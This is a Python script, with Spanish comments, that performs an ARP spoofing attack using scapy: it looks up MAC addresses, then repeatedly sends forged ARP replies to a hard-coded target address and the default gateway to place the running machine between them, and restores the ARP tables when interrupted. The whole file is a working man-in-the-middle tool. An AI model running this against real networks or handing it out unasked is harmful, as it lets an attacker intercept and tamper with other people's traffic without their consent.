#COMPONENTE QUE REALIZA EL ARP SPOOF
import scapy.all as scapy
import time
import netifaces


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # print("Impresion:",arp_request)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=True)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("sin valor de lecura")


def spoof(target_ip, spoof_ip):
    # hwdst=0
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def get_default_gateway_ip():
    gateways = netifaces.gateways()
    defaults = gateways.get("default")
    if not defaults:
        print("No hay GW")
        return

    gw_info = defaults.get(netifaces.AF_INET)
    return gw_info[0]


target_ip = "192.168.200.57"
gateway_ip = get_default_gateway_ip()



try:
    sent_packets_count = 0
    while True:

            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets sent " + str(sent_packets_count), end="")
            time.sleep(1)

except KeyboardInterrupt:
    print("error")
    print("\nCtrl + C pressed----Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] ARP Spoof Stopped")